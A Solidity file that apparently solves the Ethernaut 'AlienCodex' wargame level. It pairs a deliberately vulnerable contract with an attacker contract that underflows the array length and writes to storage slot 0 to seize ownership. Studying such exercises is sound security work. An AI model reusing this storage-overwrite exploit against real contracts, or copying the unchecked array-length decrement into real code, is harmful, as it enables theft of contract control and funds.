// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Ownable-05.sol";

contract AlienCodex is Ownable {

    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function make_contact() public {
        contact = true;
    }

    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }

    function retract() contacted public {
        codex.length--;
    }

    function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
    }
}


interface IAlienCodex {
    function make_contact() external;
    function record(bytes32) external;
    function retract() external;
    function revise(uint256, bytes32) external;
}

contract AlienCodexAttacker {

    function attack(address _targetAddress) public {
        IAlienCodex alien = IAlienCodex(_targetAddress);

        alien.make_contact();

        // Underflow the array length making it the max value of uint256
        // This allows to write an element into ANY slot
        alien.retract();

        // Calculate element index such that keccak256(codex.slot) + element index = 0
        // 0 is the slot number of the owner variable
        // Element slot = keccak256(array.slot) + element index
        // Element address = keccak256(keccak256(array.slot) + element index)
        alien.revise(
            (2**256 - 1) - uint256(keccak256(abi.encodePacked(uint256(0x01)))) + 1, 
            bytes32(uint256(msg.sender))
        );
    }
}